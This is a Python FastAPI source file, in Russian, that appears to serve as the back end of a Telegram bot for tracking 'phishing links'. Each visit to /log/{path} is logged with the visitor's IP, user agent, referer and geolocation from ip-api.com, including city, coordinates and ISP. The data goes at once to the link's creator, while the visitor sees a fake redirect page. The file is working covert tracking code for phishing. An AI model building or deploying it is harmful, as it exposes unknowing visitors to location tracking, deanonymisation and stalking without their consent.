from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import datetime
import json
import db
import aiohttp
import logging

app = FastAPI()
BOT = None

def set_bot(bot_instance):
    global BOT
    BOT = bot_instance

@app.get("/log/{path}")
async def log_visit(request: Request, path: str):
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "unknown")
    referer = request.headers.get("referer", "none")

    # Геолокация
    geo = {}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as", timeout=5) as resp:
                geo = await resp.json()
    except:
        geo = {"status": "fail"}

    # Определяем создателя
    owner_id = None
    if path and '_' in path:
        parts = path.split('_')
        if parts[0].isdigit():
            owner_id = int(parts[0])

    # Сохраняем лог
    log_entry = {
        "ip": client_ip,
        "user_agent": user_agent,
        "referer": referer,
        "geo": geo,
        "path": path,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=owner_id if owner_id else 0, action="phishing_log", query=path, result=json.dumps(log_entry, ensure_ascii=False))

    # Отправляем создателю сразу
    if owner_id and BOT:
        try:
            msg = (
                f"🕵️ <b>Новое посещение фишинг-ссылки</b>\n\n"
                f"IP: <code>{client_ip}</code>\n"
                f"Страна: {geo.get('country', '—')}\n"
                f"Город: {geo.get('city', '—')}\n"
                f"Регион: {geo.get('regionName', '—')}\n"
                f"Провайдер: {geo.get('isp', '—')}\n"
                f"Координаты: {geo.get('lat', '—')}, {geo.get('lon', '—')}\n"
                f"User-Agent: {user_agent}\n"
                f"Реферер: {referer}"
            )
            await BOT.send_message(owner_id, msg, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Не удалось отправить уведомление {owner_id}: {e}")

    # Возвращаем минимальную страницу, чтобы не задерживать
    html = """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Загрузка...</title></head>
    <body style="background:#0b0e14;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:white;font-family:Arial;">
        <div style="text-align:center;">
            <h2>Подождите, идёт перенаправление...</h2>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)
